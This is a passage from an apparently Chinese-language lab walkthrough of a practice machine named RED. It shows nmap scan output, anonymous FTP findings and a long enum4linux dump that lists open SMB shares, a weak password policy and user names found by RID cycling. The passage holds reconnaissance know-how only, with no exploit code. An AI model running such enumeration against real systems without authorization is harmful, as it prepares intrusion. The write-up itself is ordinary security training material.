class="string">|     &quot;DL[E</span></span><br><span class="line"><span class="string">|     #;3[</span></span><br><span class="line"><span class="string">|     \xf6</span></span><br><span class="line"><span class="string">|     u([r</span></span><br><span class="line"><span class="string">|     qYQq</span></span><br><span class="line"><span class="string">|     Y_?n2</span></span><br><span class="line"><span class="string">|     3&amp;M~&#123;</span></span><br><span class="line"><span class="string">|     9-a)T</span></span><br><span class="line"><span class="string">|     L&#125;AJ</span></span><br><span class="line"><span class="string">|_    .npy.9</span></span><br><span class="line"><span class="string">3306/tcp  open   mysql?</span></span><br><span class="line"><span class="string">| mysql-info: </span></span><br><span class="line"><span class="string">|   Protocol: 10</span></span><br><span class="line"><span class="string">|   Version: 5.7.12-0ubuntu1</span></span><br><span class="line"><span class="string">|   Thread ID: 65</span></span><br><span class="line"><span class="string">|   Capabilities flags: 63487</span></span><br><span class="line"><span class="string">|   Some Capabilities: Speaks41ProtocolNew, SupportsTransactions, InteractiveClient, DontAllowDatabaseTableColumn, LongColumnFlag, ODBCClient, Support41Auth, LongPassword, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, Speaks41ProtocolOld, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments</span></span><br><span class="line"><span class="string">|   Status: Autocommit</span></span><br><span class="line"><span class="string">|   Salt: \x06&#125;Z.&#x27;</span>rvcE2ze@\x140R[\x11[K</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port666-TCP:V=7.94SVN%I=7%D=10/18%Time=6712029C%P=x86_64-pc-linux-gnu%r</span></span><br><span class="line"><span class="string">SF:(NULL,2D58,&quot;PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\</span></span><br><span class="line"><span class="string">SF:0\x152\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x0</span></span><br><span class="line"><span class="string">SF:1\x04\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A</span></span><br><span class="line"><span class="string">SF:@\xa2\x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\&quot;DL\[E\</span></span><br><span class="line"><span class="string">SF:xa2\x0c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x</span></span><br><span class="line"><span class="string">SF:0f\xb2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\</span></span><br><span class="line"><span class="string">SF:xaeu\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x9</span></span><br><span class="line"><span class="string">SF:9\xd3\x08y&#125;\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;`\xfe\x20\xa7\x05:\xb4y\xaf\xf</span></span><br><span class="line"><span class="string">SF:8\xa0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce</span></span><br><span class="line"><span class="string">SF:\[\x87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x</span></span><br><span class="line"><span class="string">SF:8b\xf4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\x</span></span><br><span class="line"><span class="string">SF:e0\xdc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe</span></span><br><span class="line"><span class="string">SF:4\xd5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf</span></span><br><span class="line"><span class="string">SF:1\xaf\xbd&amp;&amp;q\xf9\x97&#x27;</span>i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\</span><br><span class="line">SF:xe2:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f&#123;\xb9\xbc\xe5:i\xb2\x</span><br><span class="line">SF:1bk\x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&amp;\xb9N\x9e&lt;\xb1\\\.\xb9\</span><br><span class="line">SF:xcc\xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c</span><br><span class="line">SF:\xfd\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x<span class="string">&#x27;\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\</span></span><br><span class="line"><span class="string">SF:xcc\x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\</span></span><br><span class="line"><span class="string">SF:xb0\xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd&#123;\xd2\xf6\xa6g\x1c8\x98u\(</span></span><br><span class="line"><span class="string">SF:\[r\xf8H~A\xe1qYQq\xc9w\xa7\xbe\?&#125;\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\</span></span><br><span class="line"><span class="string">SF:xaak\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x</span></span><br><span class="line"><span class="string">SF:7fy\xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f</span></span><br><span class="line"><span class="string">SF:\x7f\xf9\xea\xb5m\x1c\xfc\xfef\&quot;\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\</span></span><br><span class="line"><span class="string">SF:xcb\[\x93&amp;\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&amp;M~&#123;\xb9\x9b\xf7\xda-\xac\]_\x</span></span><br><span class="line"><span class="string">SF:f9\xcc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8</span></span><br><span class="line"><span class="string">SF:f\xa7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe&#123;\x81\x1d\xfb\x1fE\xf6\x1f\</span></span><br><span class="line"><span class="string">SF:x81\xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0b</span></span><br><span class="line"><span class="string">SF:I\x96\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap</span></span><br><span class="line"><span class="string">SF:\x8f\xd0\x8f\x9fu\x01\x8dvT\xf0&#x27;</span>\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&amp;</span><br><span class="line">SF:\xf4\xed\xe3v\x13O\xb73A<span class="comment">#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\</span></span><br><span class="line">SF:xcd\x88\x8e&#125;\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xb</span><br><span class="line">SF:c\xbcL&#125;AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5</span><br><span class="line">SF:\xf0\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91<span class="comment">#\xfbOg\xed\xf6\x15\</span></span><br><span class="line">SF:x04\xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6G</span><br><span class="line">SF:TQ\xf3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\</span><br><span class="line">SF:x11\?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0<span class="string">&quot;);</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:7F:98:45 (VMware)</span></span><br><span class="line"><span class="string">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span></span><br><span class="line"><span class="string">TCP/IP fingerprint:</span></span><br><span class="line"><span class="string">OS:SCAN(V=7.94SVN%E=4%D=10/18%OT=21%CT=20%CU=42206%PV=Y%DS=1%DC=D%G=Y%M=000</span></span><br><span class="line"><span class="string">OS:C29%TM=67120387%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=I</span></span><br><span class="line"><span class="string">OS:%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span></span><br><span class="line"><span class="string">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6</span></span><br><span class="line"><span class="string">OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span></span><br><span class="line"><span class="string">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span></span><br><span class="line"><span class="string">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span></span><br><span class="line"><span class="string">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</span></span><br><span class="line"><span class="string">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2024-10-18T14:41:07</span></span><br><span class="line"><span class="string">|_  start_date: N/A</span></span><br><span class="line"><span class="string">|_clock-skew: mean: 7h38m41s, deviation: 34m37s, median: 7h58m40s</span></span><br><span class="line"><span class="string">| smb-security-mode: </span></span><br><span class="line"><span class="string">|   account_used: guest</span></span><br><span class="line"><span class="string">|   authentication_level: user</span></span><br><span class="line"><span class="string">|   challenge_response: supported</span></span><br><span class="line"><span class="string">|_  message_signing: disabled (dangerous, but default)</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   3:1:1: </span></span><br><span class="line"><span class="string">|_    Message signing enabled but not required</span></span><br><span class="line"><span class="string">| smb-os-discovery: </span></span><br><span class="line"><span class="string">|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)</span></span><br><span class="line"><span class="string">|   Computer name: red</span></span><br><span class="line"><span class="string">|   NetBIOS computer name: RED\x00</span></span><br><span class="line"><span class="string">|   Domain name: \x00</span></span><br><span class="line"><span class="string">|   FQDN: red</span></span><br><span class="line"><span class="string">|_  System time: 2024-10-18T15:40:55+01:00</span></span><br><span class="line"><span class="string">|_nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   0.49 ms 192.168.159.22</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 353.74 seconds</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<h2 id="ftp-信息收集">3. FTP 信息收集</h2>
<p>ftp 匿名登陆得 note ，系统可能存在 elly，john 用户</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412102117429.jpg" /></p>
<h2 id="smb-扫描">4. SMB 扫描</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># enum4linux -a 192.168.159.22</span></span><br><span class="line">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec  9 09:14:53 2024</span><br><span class="line"></span><br><span class="line"> =========================================( Target Information )=========================================</span><br><span class="line"></span><br><span class="line">Target ........... 192.168.159.22</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===========================( Enumerating Workgroup/Domain on 192.168.159.22 )===========================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===============================( Nbtstat Information <span class="keyword">for</span> 192.168.159.22 )===============================</span><br><span class="line"></span><br><span class="line">Looking up status of 192.168.159.22</span><br><span class="line">        RED             &lt;00&gt; -         H &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        RED             &lt;03&gt; -         H &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        RED             &lt;20&gt; -         H &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         H &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ==================================( Session Check on 192.168.159.22 )==================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Server 192.168.159.22 allows sessions using username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===============================( Getting domain SID <span class="keyword">for</span> 192.168.159.22 )===============================</span><br><span class="line"></span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line"></span><br><span class="line">[+] Can<span class="string">&#x27;t determine if host is part of domain or part of a workgroup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ==================================( OS information on 192.168.159.22 )==================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">[E] Can&#x27;</span>t get OS info with smbclient                                                                                                                                                                                                        </span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">[+] Got OS info <span class="keyword">for</span> 192.168.159.22 from srvinfo:                                                                                                                                                                                            </span><br><span class="line">        RED            Wk Sv PrQ Unx NT SNT red server (Samba, Ubuntu)                                                                                                                                                                      </span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       6.1</span><br><span class="line">        server <span class="built_in">type</span>     :       0x809a03</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ======================================( Users on 192.168.159.22 )======================================</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">Use of uninitialized value <span class="variable">$users</span> <span class="keyword">in</span> <span class="built_in">print</span> at ./enum4linux.pl line 972.                                                                                                                                                                     </span><br><span class="line">Use of uninitialized value <span class="variable">$users</span> <span class="keyword">in</span> pattern match (m//) at ./enum4linux.pl line 975.</span><br><span class="line"></span><br><span class="line">Use of uninitialized value <span class="variable">$users</span> <span class="keyword">in</span> <span class="built_in">print</span> at ./enum4linux.pl line 986.</span><br><span class="line">Use of uninitialized value <span class="variable">$users</span> <span class="keyword">in</span> pattern match (m//) at ./enum4linux.pl line 988.</span><br><span class="line"></span><br><span class="line"> ================================( Share Enumeration on 192.168.159.22 )================================</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        <span class="built_in">print</span>$          Disk      Printer Drivers</span><br><span class="line">        kathy           Disk      Fred, What are we doing here?</span><br><span class="line">        tmp             Disk      All temporary files should be stored here</span><br><span class="line">        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))</span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        WORKGROUP            RED</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.159.22                                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">//192.168.159.22/print$ Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                                           </span><br><span class="line">//192.168.159.22/kathy  Mapping: OK Listing: OK Writing: N/A</span><br><span class="line">//192.168.159.22/tmp    Mapping: OK Listing: OK Writing: N/A</span><br><span class="line"></span><br><span class="line">[E] Can<span class="string">&#x27;t understand response:                                                                                                                                                                                                              </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                                                                  </span></span><br><span class="line"><span class="string">//192.168.159.22/IPC$   Mapping: N/A Listing: N/A Writing: N/A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ===========================( Password Policy Information for 192.168.159.22 )===========================</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attaching to 192.168.159.22 using a NULL share</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Trying protocol 139/SMB...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Found domain(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        [+] RED</span></span><br><span class="line"><span class="string">        [+] Builtin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Password Info for Domain: RED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        [+] Minimum password length: 5</span></span><br><span class="line"><span class="string">        [+] Password history length: None</span></span><br><span class="line"><span class="string">        [+] Maximum password age: Not Set</span></span><br><span class="line"><span class="string">        [+] Password Complexity Flags: 000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                [+] Domain Refuse Password Change: 0</span></span><br><span class="line"><span class="string">                [+] Domain Password Store Cleartext: 0</span></span><br><span class="line"><span class="string">                [+] Domain Password Lockout Admins: 0</span></span><br><span class="line"><span class="string">                [+] Domain Password No Clear Change: 0</span></span><br><span class="line"><span class="string">                [+] Domain Password No Anon Change: 0</span></span><br><span class="line"><span class="string">                [+] Domain Password Complex: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        [+] Minimum password age: None</span></span><br><span class="line"><span class="string">        [+] Reset Account Lockout Counter: 30 minutes </span></span><br><span class="line"><span class="string">        [+] Locked Account Duration: 30 minutes </span></span><br><span class="line"><span class="string">        [+] Account Lockout Threshold: None</span></span><br><span class="line"><span class="string">        [+] Forced Log off Time: Not Set</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Retieved partial password policy with rpcclient:                                                                                                                                                                                        </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">Password Complexity: Disabled                                                                                                                                                                                                               </span></span><br><span class="line"><span class="string">Minimum Password Length: 5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ======================================( Groups on 192.168.159.22 )======================================</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">[+] Getting builtin groups:                                                                                                                                                                                                                 </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">[+]  Getting builtin group memberships:                                                                                                                                                                                                     </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">[+]  Getting local groups:                                                                                                                                                                                                                  </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">[+]  Getting local group memberships:                                                                                                                                                                                                       </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">[+]  Getting domain groups:                                                                                                                                                                                                                 </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">[+]  Getting domain group memberships:                                                                                                                                                                                                      </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string"> =================( Users on 192.168.159.22 via RID cycling (RIDS: 500-550,1000-1050) )=================</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">[I] Found new SID:                                                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">S-1-22-1                                                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[I] Found new SID:                                                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">S-1-5-32                                                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[I] Found new SID:                                                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">S-1-5-32                                                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[I] Found new SID:                                                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">S-1-5-32                                                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[I] Found new SID:                                                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">S-1-5-32                                                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating users using SID S-1-22-1 and logon username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;                                                                                                                                                                 </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">S-1-22-1-1000 Unix User\peter (Local User)                                                                                                                                                                                                  </span></span><br><span class="line"><span class="string">S-1-22-1-1001 Unix User\RNunemaker (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1002 Unix User\ETollefson (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1003 Unix User\DSwanger (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1004 Unix User\AParnell (Local User)</span></span><br><span 